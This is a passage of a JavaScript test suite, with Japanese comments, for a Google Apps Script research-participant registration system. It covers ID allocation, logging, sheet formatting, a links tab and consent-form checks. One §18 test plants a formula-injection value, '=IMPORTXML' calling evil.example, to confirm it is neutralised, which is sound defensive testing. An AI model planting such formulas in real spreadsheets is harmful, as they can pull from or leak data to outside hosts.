  // --- 4. ⚠️★★★ 予約トークンが `^P\d+$` に一致しない（★ 方式全体がこれに乗っている） ---
  const ctx = makeReadyCtx();
  const t = ctx.o1ReserveToken_();
  push("§15 ⚠️★★★ 予約トークンは `^P\\d+$` に一致しない", !/^P\d+$/.test(t), { t });
  push("§15 ★ 予約トークンは o1IsValidPid_ を通らない", ctx.o1IsValidPid_(t) === false, { t });
  // ★ 3 プロジェクトが同じ規則で濾していることを**実ファイルで**突き合わせる。
  //   ⚠️ ここが崩れると、★ ⏳ の行が別プロジェクトの採番に混ざる。
  const g1src = fs.readFileSync(G1_BUILDER_PATH, "utf8");
  const phase1src = fs.readFileSync(path.join(REPO, "Form_Phase1", "GSE_Phase1_Form_Builder.gs"), "utf8");
  push(
    "§15 ⚠️★★★ G1 も Phase1 も A 列を `^P\\d+$` で濾している（★ 実ファイル照合）",
    /\/\^P\(\\d\+\)\$\//.test(g1src) && /\/\^P\(\\d\+\)\$\//.test(phase1src),
    { g1: /\/\^P\(\\d\+\)\$\//.test(g1src), phase1: /\/\^P\(\\d\+\)\$\//.test(phase1src) }
  );
  // ⚠️ トークンがロスターに残っていても採番は前へ進む（★ 混ざらないことの実測）。
  const sheet = makeSheet([["P006", "既存", "a@e.com"], ["⏳O1-DEADBEEF", "中断", "b@e.com"]]);
  push(
    "§15 ⚠️★★★ ⏳ の行があっても次番号は P007（★ 採番に混ざらない）",
    ctx.o1NextParticipantId_(sheet) === "P007",
    { got: ctx.o1NextParticipantId_(sheet) }
  );
}

{
  // --- 5. ★ 手動採番 `assignO1ParticipantId` も同じ経路を通る ---
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  const pid = ctx.assignO1ParticipantId();
  push("§15 ★ 手動採番も P007 を返す", pid === "P007", { pid });
  push("§15 ★ 手動採番でも ⏳ が残らない",
    roster.__rows.every((r) => String(r[0]).indexOf("⏳") < 0), { rows: roster.__rows });
  push("§15 ★ 手動採番も登録ログに残る",
    logRows(ctx).some(
      (r) => r[1] === "assign" && r[2] === "P007"
    ),
    { rows: logRows(ctx) });
}

// ============================================================
// §16 ⚠️★★★ レビュー (2026-09-03) で「検査が無い」と実測された経路
// ============================================================
{
  // --- HIGH-1: ⚠️ ロスターの表記ゆれで採番が**恒久デッドロック**しないこと ---
  //   ★ `p007`（小文字）は `o1NextParticipantId_` の `^P(\d+)$` に**一致しない**ので
  //     候補は毎回 P007 に固定される。⚠️ 数える側が正規化していると毎回 2 行に見え、
  //     ★ 3 回とも譲って null になり、**以後すべての新規登録が止まる**。
  ["p007", " P007"].forEach((drift) => {
    const ctx = makeReadyCtx({
      roster: [
        ["P006", "既存", "old@example.com"],
        [drift, "表記ゆれ", "drift@example.com"],
      ],
    });
    const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "新規",
        [ctx.Q_O1_EMAIL]: "new@example.com",
        [ctx.Q_O1_OS]: "Mac",
      })
    );
    const mine = roster.__rows.filter((r) => String(r[2]) === "new@example.com");
    push(
      `§16 ⚠️★★★ A 列に "${drift}" があっても採番は止まらない（★ P007 が出る）`,
      mine.length === 1 && mine[0][0] === "P007",
      { rows: roster.__rows.map((r) => r[0]) }
    );
    // ⚠️★★ **メールは送らないのが正しい。** ★ `P007` と `p007` は人間には同じ ID に見えるので、
    //   ⚠️ そのまま配ると 2 人ぶんが 1 つの P-ID に混ざりうる。→ ★ 研究者に直させる。
    //   ★ 旧実装との違いは「**止まり方**」である: 恒久デッドロックではなく、
    //     ⚠️ **どの行を直せばよいかを名指しして** 1 回で止まる。
    push(
      `§16 ⚠️ "${drift}" では配らない（★ 同じ ID に見える行があるため）`,
      ctx.__mails.length === 0,
      { mails: ctx.__mails.length }
    );
    push(
      `§16 ⚠️★★★ "${drift}" で「同時採番ではありません」と正しい原因を言う`,
      ctx.__logs.some((l) => l.indexOf("これは**同時採番ではありません**") >= 0) &&
        ctx.__logs.some((l) => l.indexOf("書き方が違います") >= 0),
      {}
    );
    push(
      `§16 ★ "${drift}" の理由コードは roster-pid-format-drift`,
      logRows(ctx, MGMT_REJECT_TAB).some((r) => r[4] === "roster-pid-format-drift"),
      { rows: logRows(ctx, MGMT_REJECT_TAB) }
    );
  });
}

{
  // --- HIGH-1b: ★ **陰性対照** —— 生値が本当に同じなら「同時採番」と言うこと ---
  //   ⚠️ 表記ゆれ側だけ緑にして満足しない。★ 2 つの原因を**言い分けている**ことを測る。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "既存", "old@example.com"],
      ["P007", "本人", "dup@example.com"],
      ["P007", "衝突した別人", "clash@example.com"],
    ],
  });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "本人",
      [ctx.Q_O1_EMAIL]: "dup@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§16 ★ 陰性対照: 生値が同じなら「同時採番」と言う（★ 表記ゆれとは言わない）",
    ctx.__logs.some((l) => l.indexOf("同時に採番された**可能性") >= 0) &&
      !ctx.__logs.some((l) => l.indexOf("書き方が違います") >= 0),
    {}
  );
  push(
    "§16 ★ そのときの理由コードは dup-pid",
    logRows(ctx, MGMT_REJECT_TAB).some((r) => r[4] === "dup-pid"),
    { rows: logRows(ctx, MGMT_REJECT_TAB) }
  );
}

{
  // --- HIGH-1c: ★ 不変条件の番人が**発火すること**を撃つ ---
  //   ⚠️ この分岐は、`o1CountPidRows_` と `o1NextParticipantId_` の見方が揃っている限り
  //     **構造的に到達しない**（★ それが修正の要点である）。
  //   → ★ だから「見方がずれた未来」を**注入して**撃つ（⚠️ さもないと死んだコードになる）。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  const token = "⏳O1-TESTTOKN";
  roster.appendRow([token, "予約", "r@example.com", ""]);
  ctx.o1CountPidRows_ = () => 2; // ⚠️ 「数える側だけ正規化してしまった」未来を再現
  const got = ctx.o1SettlePidForToken_(roster, token);
  push(
    "§16 ⚠️★★★ 見方がずれたら roster-pid-format-drift で止まる（★ 恒久停止に戻らない）",
    got && got.pid === null && got.reason === "roster-pid-format-drift",
    { got }
  );
  push(
    "§16 ★ 3 回粘らず 2 回目で止める（⚠️ 無駄に書き込まない）",
    ctx.__logs.filter((l) => l.indexOf("が重複したので譲りました") >= 0).length === 1,
    { yields: ctx.__logs.filter((l) => l.indexOf("が重複したので譲りました") >= 0).length }
  );
  push(
    "§16 ★ 原因として**読み方のずれ**を名指しする",
    ctx.__logs.some((l) => l.indexOf("違う見方で A 列を読んでいます") >= 0),
    {}
  );
}

{
  // --- HIGH-2: ⚠️ 例外が出ても**必ず 1 行残る**（★ fail-open の穴） ---
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  ctx.__onFlush = () => {
    throw new Error("stub: Sheets 一時障害");
  };
  const r = attempt(() =>
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "新規",
        [ctx.Q_O1_EMAIL]: "new@example.com",
        [ctx.Q_O1_OS]: "Mac",
      })
    )
  );
  push("§16 ⚠️ 例外はハンドラの外へ漏らさない", !r.threw, { threw: r.threw, msg: r.message });
  // ★ flush の失敗は `o1AllocatePidRow_` が捕まえるので、⚠️ 理由は `settle-exception`。
  push(
    "§16 ⚠️★★★ 採番中の例外でも 1 行残る（settle-exception）",
    logRows(ctx, MGMT_REJECT_TAB).some((x) => x[4] === "settle-exception"),
    { rows: logRows(ctx, MGMT_REJECT_TAB) }
  );
  push("§16 ★ 受付メールは送らない", ctx.__mails.length === 0, { mails: ctx.__mails.length });
}

{
  // --- HIGH-2b: ⚠️ **どこにも捕まらない例外**でも 1 行残ること（★ 最後の網） ---
  //   ★ 既存参加者の経路で `getValue` を投げさせる（⚠️ ここは try で囲まれていない）。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  const orig = roster.getRange;
  roster.getRange = (row, col, nr, nc) => {
    if (nr === undefined) throw new Error("stub: セルが読めない");
    return orig(row, col, nr, nc);
  };
  const r = attempt(() =>
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "既存",
        [ctx.Q_O1_EMAIL]: "old@example.com",
        [ctx.Q_O1_OS]: "Mac",
      })
    )
  );
  push("§16 ⚠️★★★ 未捕捉の例外もハンドラの外へ漏らさない", !r.threw, {
    threw: r.threw,
    msg: r.message,
  });
  push(
    "§16 ⚠️★★★ そのとき登録ログに error / unexpected-exception が残る",
    logRows(ctx).some((x) => x[3] === "error" && x[4] === "unexpected-exception"),
    { rows: logRows(ctx) }
  );
  push("§16 ★ 受付メールは送らない", ctx.__mails.length === 0, { mails: ctx.__mails.length });
}

{
  // --- ⚠️★★★ `o1LogMgmt_` が**絶対に例外を投げない**（★ 変異体で 185 全緑だった穴） ---
  const ctx = makeReadyCtx();
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  log.appendRow = () => {
    throw new Error("stub: 追記できない");
  };
  const r = attempt(() =>
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "新規",
        [ctx.Q_O1_EMAIL]: "new@example.com",
        [ctx.Q_O1_OS]: "Mac",
      })
    )
  );
  push("§16 ⚠️★★★ 追記が投げても登録は止まらない（fail-open）", !r.threw && ctx.__mails.length === 1, {
    threw: r.threw,
    mails: ctx.__mails.length,
  });
  push(
    "§16 ★ 追記に失敗したことはログに残る",
    ctx.__logs.some((l) => l.indexOf("登録ログの追記に失敗しました") >= 0),
    {}
  );
  // ★ `getLastRow` が投げる場合も同じ（⚠️ 別の入口を塞ぎ忘れない）。
  const c2 = makeReadyCtx();
  c2.__sheets[MGMT_ID][MGMT_TAB].getLastRow = () => {
    throw new Error("stub: 読めない");
  };
  const r2 = attempt(() =>
    c2.onO1ConsentSubmit(
      makeResponse({
        [c2.Q_O1_NAME]: "新規",
        [c2.Q_O1_EMAIL]: "new@example.com",
        [c2.Q_O1_OS]: "Mac",
      })
    )
  );
  push("§16 ★ getLastRow が投げても登録は止まらない", !r2.threw && c2.__mails.length === 1, {
    threw: r2.threw,
    mails: c2.__mails.length,
  });
}

{
  // --- ⚠️★★★ 却下ログが満杯でも**登録ログは書ける**（★ 監査証跡の遠隔抑止を塞ぐ） ---
  const many = [];
  for (let i = 0; i < 2000; i++) many.push(["t", "register", "", "blocked", "bad-pid-format", ""]);
  const ctx = makeReadyCtx({ mgmtRejectRows: many });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§16 ⚠️★★★ 却下ログが満杯でも正規の登録は記録される",
    logRows(ctx).some((r) => r[3] === "ok" && r[4] === "new-pid"),
    { rows: logRows(ctx) }
  );
  // ★ 却下側が満杯になったことは、**消えない側**に 1 度だけ残る。
  const c2 = makeReadyCtx({ mgmtRejectRows: many });
  c2.onO1ConsentSubmit(
    makeResponse({ [c2.Q_O1_NAME]: "誰か", [c2.Q_O1_EMAIL]: "", [c2.Q_O1_OS]: "Mac" })
  );
  c2.onO1ConsentSubmit(
    makeResponse({ [c2.Q_O1_NAME]: "誰か", [c2.Q_O1_EMAIL]: "", [c2.Q_O1_OS]: "Mac" })
  );
  const noted = logRows(c2).filter((r) => r[4] === "reject-log-full");
  push("§16 ★ 却下ログ満杯は登録ログに **1 度だけ**記録される", noted.length === 1, {
    noted: noted.length,
  });
  push(
    "§16 ⚠️ 却下側は上限を超えて増えない（★ 消しもしない）",
    logRows(c2, MGMT_REJECT_TAB).length === 2000,
    { rows: logRows(c2, MGMT_REJECT_TAB).length }
  );
}

{
  // --- ⚠️ `filled-blank-pid` の経路も読み返しを通る（★ #5 の穴が 1 経路だけ残っていた） ---
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "既存", "old@example.com"],
      ["", "先に氏名だけ入れた行", "blank@example.com"],
    ],
  });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  let fired = false;
  ctx.__onFlush = () => {
    if (fired) return;
    if (!roster.__rows.some((r) => String(r[0]) === "P007")) return;
    fired = true;
    roster.appendRow(["P007", "G1 の被験者", "g1@example.com", "Win"]); // ⚠️ 割り込み
  };
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "本人",
      [ctx.Q_O1_EMAIL]: "blank@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const mine = roster.__rows.filter((r) => String(r[2]) === "blank@example.com");
  push(
    "§16 ⚠️★★★ 空 P-ID 行の採番も割り込みで譲る（P007 → P008）",
    mine.length === 1 && mine[0][0] === "P008",
    { rows: roster.__rows.map((r) => [r[0], r[2]]) }
  );
  push("§16 ★ 相手の行は書き換えない",
    roster.__rows.some((r) => String(r[0]) === "P007" && String(r[2]) === "g1@example.com"), {});
  push("§16 ★ 理由は filled-blank-pid のまま",
    logRows(ctx).some((r) => r[2] === "P008" && r[4] === "filled-blank-pid"),
    { rows: logRows(ctx) });
}

{
  // --- cross-review HIGH: ⚠️ **空 P-ID 行の採番でも例外を捕まえる** ---
  //   ★ 新規行 (`o1AllocatePidRow_`) には catch があったが、⚠️ **こちらには無かった**。
  //   ⚠️ 落ちると A 列が「見た目は有効な P-ID」のまま残り、
  //     ★ `checkO1RosterShape()` の ⏳ 残置検出に**引っかからない**。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "既存", "old@example.com"],
      ["", "先に氏名だけ入れた行", "blank@example.com"],
    ],
  });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  let n = 0;
  ctx.__onFlush = () => {
    n += 1;
    if (n === 2) throw new Error("stub: 採番中に落ちる"); // ★ トークンを書いた**後**で落とす
  };
  const r = attempt(() =>
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "本人",
        [ctx.Q_O1_EMAIL]: "blank@example.com",
        [ctx.Q_O1_OS]: "Mac",
      })
    )
  );
  push("§16 ⚠️ 空 P-ID 行の例外もハンドラの外へ漏らさない", !r.threw, {
    threw: r.threw,
    msg: r.message,
  });
  push("§16 ★ 受付メールは送らない", ctx.__mails.length === 0, { mails: ctx.__mails.length });
  // ⚠️★★★ **中途半端な P-ID を残さない**（★ ⏳ に戻っていること）。
  const target = roster.__rows.filter((x) => String(x[2]) === "blank@example.com")[0];
  push(
    "§16 ⚠️★★★ 落ちたら A 列は ⏳ に戻る（★ 見た目だけ有効な P-ID を残さない）",
    target && String(target[0]).indexOf("⏳O1-") === 0,
    { colA: target && target[0] }
  );
  push(
    "§16 ★ 理由は settle-exception として残る",
    logRows(ctx, MGMT_REJECT_TAB).some((x) => x[4] === "settle-exception"),
    { rows: logRows(ctx, MGMT_REJECT_TAB) }
  );
}

// ============================================================
// §17 見た目（2026-09-28・`.steering/20260928-o1-mgmt-sheet-design/`）
//   ★ 値には触れず、見出し帯・固定行・条件付き書式だけを付ける。
// ============================================================
{
  const UI = JSON.parse(JSON.stringify(makeReadyCtx().O1_MGMT_UI));
  // 新規: タブが無い表で buildO1MgmtSheet → 2 枚とも作られ、見た目が付く
  const ctx = makeReadyCtx({ noMgmtSheet: true });
  ctx.__sheets[MGMT_ID] = {};
  const r = attempt(() => ctx.buildO1MgmtSheet());
  const reg = ctx.__sheets[MGMT_ID][MGMT_TAB];
  const rej = ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB];
  push("§17 新規: 2 枚とも作られ 2 行を固定", !r.threw && reg.__frozen === 2 && rej.__frozen === 2, { threw: r.threw, reg: reg && reg.__frozen, rej: rej && rej.__frozen });
  push("§17 見出しは紺帯・白字", reg.__style["2,1"].bg === UI.navy && reg.__style["2,1"].fg === UI.white, { style: reg.__style["2,1"] });
  push("§17 却下ログはバナーとタブが赤（登録ログと見分けがつく）", rej.__style["1,1"].bg === UI.dangerBg && rej.__tab === UI.dangerFg && reg.__tab === UI.navy, { rej: rej.__style["1,1"], tabs: [reg.__tab, rej.__tab] });
  const rules = JSON.parse(JSON.stringify(reg.__rules)).map((x) => [x.formula, x.ranges[0], x.bg]);
  push(
    "§17★ 条件付き書式: 結果の色（ok=緑 / partial=黄 / error・blocked=赤）を**先に**、system の行=灰を最後に・列だけで開いた範囲",
    JSON.stringify(rules) === JSON.stringify([
      ['=$D3="ok"', "D3:D", UI.okBg],
      ['=$D3="partial"', "D3:D", UI.warnBg],
      ['=OR($D3="error",$D3="blocked")', "D3:D", UI.dangerBg],
      ['=$B3="system"', "A3:F", UI.grayBg],
    ]),
    { rules }
  );
}
{
  // ⚠️ 書式が例外でも buildO1MgmtSheet は落ちず、値も変わらない
  const rows = [["2026-09-20 10:00:00", "register", "P001", "ok", "new-pid", ""]];
  const ctx = makeReadyCtx({ mgmtRows: rows });
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  log.setConditionalFormatRules = () => {
    throw new Error("rules quota");
  };
  const before = JSON.stringify(log.__grid);
  const r = attempt(() => ctx.buildO1MgmtSheet());
  push("§17★ 書式が例外でも落ちず・値は不変・理由をログに出す", !r.threw && JSON.stringify(log.__grid) === before && ctx.__logs.some((l) => /見た目を整えられませんでした/.test(l)), { threw: r.threw });
}
{
  // 既存: 行のあるタブ → 値は 1 つも変えずに見た目だけ付く・2 回目は付け直さない
  const rows = [["2026-09-20 10:00:00", "register", "P001", "ok", "new-pid", "OS: Mac"]];
  const ctx = makeReadyCtx({ mgmtRows: rows });
  const log = ctx.__sheets[MGMT_ID][MGMT_TAB];
  const before = JSON.stringify(log.__grid);
  ctx.buildO1MgmtSheet();
  push("§17★ 既存: 値は 1 つも変わらない", JSON.stringify(log.__grid) === before, { before, after: JSON.stringify(log.__grid) });
  push("§17 既存: 見た目が付く（固定 2・ログに「見た目を整えました」）", log.__frozen === 2 && ctx.__logs.some((l) => /見た目を整えました/.test(l)), { frozen: log.__frozen });
  log.__widths[5] = 999; // 研究者が列幅を変えた
  ctx.buildO1MgmtSheet();
  push("§17★ 2 回目は付け直さない（研究者の列幅を戻さない）", log.__widths[5] === 999, { w: log.__widths[5] });
}

// ============================================================
// §18 O1 リンク集（2026-10-07・`.steering/20261007-o1-links-tab/`）
//   ★ 派生の表示なので毎回作り直す。⚠️ 手で入れた欄は保ち、ロスターの ID・PII・秘密は書かない。
// ============================================================
const LINKS_TAB = "O1 リンク集";
const linksText = (ctx) => JSON.stringify(ctx.__sheets[MGMT_ID][LINKS_TAB].__grid);
const linksValue = (ctx, label) => {
  const row = ctx.__sheets[MGMT_ID][LINKS_TAB].__grid.find((r) => r[0] === label);
  return row ? row[1] : undefined;
};
function readyWithFormUrls(extra) {
  const ctx = makeReadyCtx(extra);
  ctx.__props.FORMURL_O1_CONSENT = JSON.stringify({
    label: "O1-C", id: O1_C, title: "同意", editUrl: "https://forms.example/c/edit", publishedUrl: "https://forms.example/c/view",
  });
  ctx.__props.FORMURL_O1_SURVEY = JSON.stringify({
    label: "O1-S", id: O1_S, title: "アンケート", editUrl: "https://forms.example/s/edit", publishedUrl: "https://forms.example/s/view",
  });
  return ctx;
}
{
  // 陽性対照: フォーム 2 本の回答 URL・編集 URL とアプリの入手先が載る
  const ctx = readyWithFormUrls();
  const r = attempt(() => ctx.refreshO1LinksTab());
  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
  push("§18 refreshO1LinksTab でリンク集ができる", !r.threw && !!sh, { threw: r.threw, message: r.message });
  push(
    "§18★ O1-C / O1-S の回答 URL・編集 URL が載る",
    linksValue(ctx, "O1-C 説明・同意（参加登録）— 回答 URL") === "https://forms.example/c/view" &&
      linksValue(ctx, "O1-C — 編集 URL") === "https://forms.example/c/edit" &&
      linksValue(ctx, "O1-S 終了後アンケート — 回答 URL") === "https://forms.example/s/view" &&
      linksValue(ctx, "O1-S — 編集 URL") === "https://forms.example/s/edit",
    { grid: sh && sh.__grid.slice(4, 9) }
  );
  push("§18 アプリの入手先が載る", linksValue(ctx, "アプリの入手先（O1_APP_DOWNLOAD_URL）") === "https://drive.example/o1", {});
  // ★ 研究者依頼（2026-10-07）: 各リンクに「いつ・誰が使うか」を載せる
  const whenOf = (label) => {
    const row = sh.__grid.find((r) => r[0] === label);
    return row ? String(row[3]) : "";
  };
  push(
    "§18★ 全行が 5 列（項目 / 値 / 種別 / いつ・誰が / 備考）で、見出しに「いつ・誰が使うか」がある",
    sh.__grid.every((r) => r.length === 5) && sh.__grid.some((r) => r[3] === "いつ・誰が使うか"),
    { lens: [...new Set(sh.__grid.map((r) => r.length))] }
  );
  push(
    "§18★ O1-C は【募集時】・O1-S は「O1 終了判定」タブで終了になった後・アプリは受付メールで届く、と書いてある",
    /【募集時】/.test(whenOf("O1-C 説明・同意（参加登録）— 回答 URL")) &&
      /「O1 終了判定」タブが終了（連絡待ち）になった後/.test(whenOf("O1-S 終了後アンケート — 回答 URL")) &&
      /受付メール/.test(whenOf("アプリの入手先（O1_APP_DOWNLOAD_URL）")),
    {
      c: whenOf("O1-C 説明・同意（参加登録）— 回答 URL"),
      s: whenOf("O1-S 終了後アンケート — 回答 URL"),
    }
  );
  push(
    "§18 リンクと手で入れる欄のすべてに「いつ・誰が使うか」がある（空にしない）",
    sh.__grid.filter((r) => ["自動", "手動", "参照"].includes(r[2]) && r[0] !== "更新").every((r) => String(r[3]).length > 0),
    {}
  );
  push("§18 説明の列は折り返す", !!sh.__style["6,4"] && sh.__style["6,4"].wrap === true, { style: sh.__style["6,4"] });
  // ⚠️★★★ ロスターの ID（氏名・メールへのポインタ）を書かない
  push("§18★★★ 参加者ロスターの ID を書かない", sh && linksText(ctx).indexOf(ROSTER_ID) < 0, {});
  push("§18★★ ロスターのメール（PII）を書かない", sh && !/@/.test(linksText(ctx)), {});
  push("§18 フォームが未生成なら「未生成」と出す（空にしない）", (() => {
    const c2 = makeReadyCtx();
    c2.refreshO1LinksTab();
    return /未生成/.test(String(linksValue(c2, "O1-S 終了後アンケート — 回答 URL")));
  })(), {});
}
{
  // ★ 手で入れた欄は作り直しても保つ
  const ctx = readyWithFormUrls();
  ctx.refreshO1LinksTab();
  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
  const row = sh.__grid.findIndex((r) => r[0] === "提出物の受取フォルダ（Drive）");
  sh.__grid[row][1] = "https://drive.example/inbox";
  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
  sh.__grid[memo][1] = "10/8 開始";
  ctx.__props.O1_APP_DOWNLOAD_URL = "https://drive.example/o1-new";
  ctx.refreshO1LinksTab();
  push(
    "§18★ 作り直しても手で入れた欄（受取フォルダ・メモ）は保ち、自動の欄は新しい値になる",
    linksValue(ctx, "提出物の受取フォルダ（Drive）") === "https://drive.example/inbox" &&
      linksValue(ctx, "メモ") === "10/8 開始" &&
      linksValue(ctx, "アプリの入手先（O1_APP_DOWNLOAD_URL）") === "https://drive.example/o1-new" &&
      sh.__cleared === 2,
    { cleared: sh.__cleared }
  );
}
{
  // ⚠️★ 読み戻した値が `=` で始まる文字列だった場合の防御（★ 実物では数式は表示値で読まれるので、
  //   ここは「表示値が `=` で始まる」場合の守り。⚠️ 偽シートは文字列をそのまま返す）
  const ctx = readyWithFormUrls();
  ctx.refreshO1LinksTab();
  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
  sh.__grid[memo][1] = '=IMPORTXML("https://evil.example","//a")';
  ctx.refreshO1LinksTab();
  push("§18★ 読み戻した値が `=` で始まっても数式として書き戻さない（先頭に '）", String(linksValue(ctx, "メモ")).indexOf("'=") === 0, { v: linksValue(ctx, "メモ") });
}
{
  // ★ 日付は表示の形のまま引き継ぐ（⚠️ getValues だと "Thu Oct 08 2026 …" に化ける）
  const ctx = readyWithFormUrls();
  ctx.refreshO1LinksTab();
  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
  sh.__grid[memo][1] = new Date(2026, 9, 8);
  ctx.refreshO1LinksTab();
  push("§18★ 手で入れた日付は表示の形（2026/10/08）で保つ", linksValue(ctx, "メモ") === "2026/10/08", { v: linksValue(ctx, "メモ") });
}
{
  // ★ 同じ項目名の行が複数あれば、空でない最初の値を採る（⚠️ コピーした空の行で消さない）
  const ctx = readyWithFormUrls();
  ctx.refreshO1LinksTab();
  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
  sh.__grid[memo][1] = "最初";
  sh.__grid.push(["メモ", "", "手動", ""]);
  sh.__grid.push(["メモ", "後ろ", "手動", ""]);
  ctx.refreshO1LinksTab();
  push(
    "§18★ 同じ項目名が複数: 空でない最初の値を採り、重複をログに出す",
    linksValue(ctx, "メモ") === "最初" && ctx.__logs.some((l) => /「メモ」の行が複数/.test(l)),
    { v: linksValue(ctx, "メモ") }
  );
  const c2 = readyWithFormUrls();
  c2.refreshO1LinksTab();
  const s2 = c2.__sheets[MGMT_ID][LINKS_TAB];
  const m2 = s2.__grid.findIndex((r) => r[0] === "メモ");
  s2.__grid[m2][1] = "";
  s2.__grid.push(["メモ", "下に書いた", "手動", ""]);
  c2.refreshO1LinksTab();
  push("§18 同じ項目名が複数: 最初が空なら下の値を採る", linksValue(c2, "メモ") === "下に書いた", { v: linksValue(c2, "メモ") });
}
{
  // ⚠️★★ リンク集が作れなくても、buildO1MgmtSheet はログのタブを用意し、作れていないと肯定形で言う
  const ctx = readyWithFormUrls({ noMgmtSheet: true });
  ctx.__sheets[MGMT_ID] = {};
  ctx.o1BuildLinksTab_ = () => {
    throw new Error("stub: links failed");
  };
  const r = attempt(() => ctx.buildO1MgmtSheet());
  push(
    "§18★★ リンク集が投げても build は止まらず、ログ 2 枚はでき、「作れていません」と言う",
    !r.threw && !!ctx.__sheets[MGMT_ID][MGMT_TAB] && !!ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB] &&
      ctx.__logs.some((l) => /作れていません/.test(l)),
    { threw: r.threw, message: r.message }
  );
}
{
  // ⚠️★★★ 「参加者ロスター」タブを持つ表には書かない
  const ctx = readyWithFormUrls({ mgmtHasRoster: true });
  const r = attempt(() => ctx.refreshO1LinksTab());
  push("§18★★★ ロスタータブを持つ表には書かない（止まる・タブを作らない）", r.threw && !ctx.__sheets[MGMT_ID][LINKS_TAB], { threw: r.threw });
}
{
  // ⚠️★★★ 運営シートの ID が無ければ止まる（★ どこにも書かない）
  const ctx = readyWithFormUrls({ noMgmtProp: true });
  const r = attempt(() => ctx.refreshO1LinksTab());
  push(
    "§18★ O1_MGMT_SHEET_ID が空なら、表を開く前に理由を言って止まる",
    r.threw && /O1_MGMT_SHEET_ID が空/.test(r.message) && !ctx.__sheets[MGMT_ID][LINKS_TAB],
    { threw: r.threw, message: r.message }
  );
  // ⚠️★★ 運営シートの ID がロスターと同じ表を指していたら、設定の段階で止まる
  //   （★ ロスタータブの判定は二重目の守り。一重目が外れても赤になるよう理由の文面で見る）
  const c2 = readyWithFormUrls({ mgmtSheetId: ROSTER_ID });
  const r2 = attempt(() => c2.refreshO1LinksTab());
  push(
    "§18★★ O1_MGMT_SHEET_ID がロスターと同じ表なら、設定の段階で止まる",
    r2.threw && /PHASE1_MGMT_SHEET_ID と同じ表/.test(r2.message) && !c2.__sheets[ROSTER_ID][LINKS_TAB],
    { threw: r2.threw, message: r2.message }
  );
}
{
  // ⚠️★★★ 登録ログ・却下ログの値を 1 つも変えない（buildO1MgmtSheet 経由でも）
  const rows = [["2026-09-20 10:00:00", "register", "P001", "ok", "new-pid", "OS: Mac"]];
  const ctx = readyWithFormUrls({ mgmtRows: rows, mgmtRejectRows: [["2026-09-20 10:01:00", "register", "", "blocked", "bad-pid", ""]] });
  const reg = JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_TAB].__grid);
  const rej = JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB].__grid);
  const r = attempt(() => ctx.buildO1MgmtSheet());
  push(
    "§18★★★ buildO1MgmtSheet がリンク集も作り、ログ 2 枚の値は不変",
    !r.threw && !!ctx.__sheets[MGMT_ID][LINKS_TAB] &&
      JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_TAB].__grid) === reg &&
      JSON.stringify(ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB].__grid) === rej,
    { threw: r.threw }
  );
}

// ============================================================
// §19 O1-C の登録用の設問の照合と修復（2026-10-08・`.steering/20261008-o1c-form-missing-fields/`）
// ============================================================
// 実物の O1-C が「参加者ID」で終わり、お名前・メールアドレス・パソコンの種類が無かった。
// 提出は no-email で却下され、参加者には「メールへお送りします」とだけ出ていた。
// 10/03 の migrateO1ConsentForm は同意項目しか見ずに「フォームはコードと一致しています」と出していた。

/** 構築したあと、末尾の n 個の設問を消した O1-C（実物で見た形を作る）。 */
function brokenConsentCtx(dropTail, responses) {
  // 回答 0 件で構築してから回答を入れる（構築は回答があると止まる）。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const form = ctx.__forms[O1_C];
  form.__responses = responses === undefined ? 1 : responses;
  form.__items = form.__items.slice(0, form.__items.length - dropTail);
  form.__deleted = 0;
  ctx.__logs.length = 0;
  return ctx;
}
const titlesOf = (form) => form.__items.map((i) => i.__title);
/** 照合が例外を出したら、それも問題として返す（落ちて検査が止まらないように）。 */
const shapeProblems = (ctx, form) => {
  try {
    return ctx.o1ConsentFormShapeProblems_(form);
